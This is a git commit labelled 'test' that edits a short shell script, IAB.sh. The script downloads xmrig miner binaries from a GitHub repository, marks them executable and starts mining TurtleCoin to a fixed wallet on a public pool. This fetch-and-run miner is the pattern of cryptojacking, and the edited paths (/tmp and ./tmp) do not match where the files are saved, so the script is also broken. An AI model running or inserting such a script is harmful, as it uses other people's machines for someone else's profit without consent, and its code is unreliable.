fc1ce6e22cb010f2241fd19831014cf5f256ec00
jeffthorne <jthorne@u.washington.edu>
2021-03-08 20:07:23 -0800

    test

--- IAB.sh
+++ IAB.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
-chmod +X xmrigDaemon
+chmod +x /tmp/xmrigDaemon
 wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O xmrigMiner
-chmod +X xmrigMiner
-./xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2
+chmod +x /tmp/xmrigMiner
+./tmp/xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2
 
